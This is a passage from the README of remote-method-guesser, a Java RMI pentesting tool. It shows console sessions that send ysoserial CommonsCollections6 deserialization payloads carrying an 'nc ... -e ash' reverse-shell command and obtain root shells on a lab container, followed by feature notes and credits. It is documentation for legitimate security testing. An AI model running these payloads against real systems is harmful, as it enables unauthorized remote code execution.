[qtc@devbox ~]$ rmg listen 172.17.0.1 4444 CommonsCollections6 'nc 172.17.0.1 4445 -e ash'
[+] Creating ysoserial payload... done.
[+] Creating a JRMPListener on 172.17.0.1:4444.
[+] Handing off to ysoserial...
Have connection from /172.17.0.2:55470
Reading message...
Sending return with payload for obj [0:0:0, 123]
Closing connection

[qtc@devbox ~]$ nc -vlp 4445
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4445
Ncat: Listening on 0.0.0.0:4445
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:45429.
id
uid=0(root) gid=0(root) groups=0(root)
```

During it's ``enum`` action, *remote-method-guesser* informs you whether an *Activator* is present on an *RMI endpoint* (legacy *RMI component*).
The default implementation for the *Activation system* does not implement any deserialization filters for the *Activator RemoteObject*. Therefore,
deserialization attacks on an *Activator* endpoint should always work, even on most recent *Java versions*.

```console
[qtc@devbox ~]$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --component act
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on Activation endpoint...
[+]
[+] 	Caught IllegalArgumentException during deserialization attack.
[+] 	Deserialization attack was probably successful :)

[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:44673.
id
uid=0(root) gid=0(root) groups=0(root)
```


##### Application Level

Whereas modern *Java RMI* implementations protect well known *RMI components* with *deserialization filters* per default, custom
*RemoteObjects* (actual *RMI applications*) are usually not protected. Remote methods that do not only use primitive types within
their arguments can therefore be used for *deserialization attacks*.
This [blog post](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/) by [Hans-Martin Münch](https://twitter.com/h0ng10)
explains this issue in more detail. *remote-method-guesser* can be used to easily verify such vulnerabilities. As an example,
we can use the ``String login(java.util.HashMap dummy1)`` method of the *remote-method-guesser's* example server to perform a
deserialization attack:

```console
[qtc@devbox ~]$ rmg serial 172.17.0.2 9010 CommonsCollections6 'nc 172.17.0.1 4444 -e ash' --signature 'String login(java.util.HashMap dummy1)' --bound-name legacy-service
[+] Creating ysoserial payload... done.
[+]
[+] Attempting deserialization attack on RMI endpoint...
[+]
[+] 	Using non primitive argument type java.util.HashMap on position 0
[+] 	Specified method signature is String login(java.util.HashMap dummy1)
[+]
[+] 	Caught ClassNotFoundException during deserialization attack.
[+] 	Server attempted to deserialize dummy class c0ba245a659945bb93a49a3ab4b1e430.
[+] 	Deserialization attack probably worked :)

[qtc@devbox ~]$ nc -vlp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 172.17.0.2.
Ncat: Connection from 172.17.0.2:35377.
id
uid=0(root) gid=0(root) groups=0(root)
```


### More Features

*remote-method-guesser* includes many features that are not explained within this *README.md* file. Some
of them are listed below:

* Almost all operations can be used with the ``--ssrf`` option to create an *SSRF* payload for the corresponding
  operation.
* If you obtained binary *RMI server* output (e.g. after an *SSRF* attack), you can feed it into *remote-method-guesser*
  by using the ``--ssrf-response`` option. This parses the server output as it was obtained by the specified operation.
* *remote-method-guesser* can be extended by using it's *Plugin System*. Four interfaces (``IPayloadProvider``, ``IResponseHandler``,
  ``IArgumentProvider`` and ``ISocketFactoryProvider``) can be used to adopt *remote-method-guesser* to more complex
  usage scenarios.
* During the ``guess`` action, you can use the ``--create-samples`` option to generate *Java* code that can be used to
  invoke successfully guessed methods.

More information on these features can be found within the [documentation folder](/docs).


### Acknowledgements

----

*remote-method-guesser* was heavily influenced by the blog posts of [Hans-Martin Münch](https://mogwailabs.de/en/blog/2019/03/attacking-java-rmi-services-after-jep-290/)
and [Jake Miller](https://labs.bishopfox.com/tech-blog/rmiscout). Furthermore, the [rmiscout wordlist](./wordlists/rmiscout.txt) was obviously copied from the [rmiscout](https://github.com/BishopFox/rmiscout)
project (as you can already tell by the different license agreement). Thanks *Jake*, for this awesome wordlist of *remote methods* collected from different *GitHub* repositories.

*Copyright 2021, Tobias Neitzel and the remote-method-guesser contributors.*
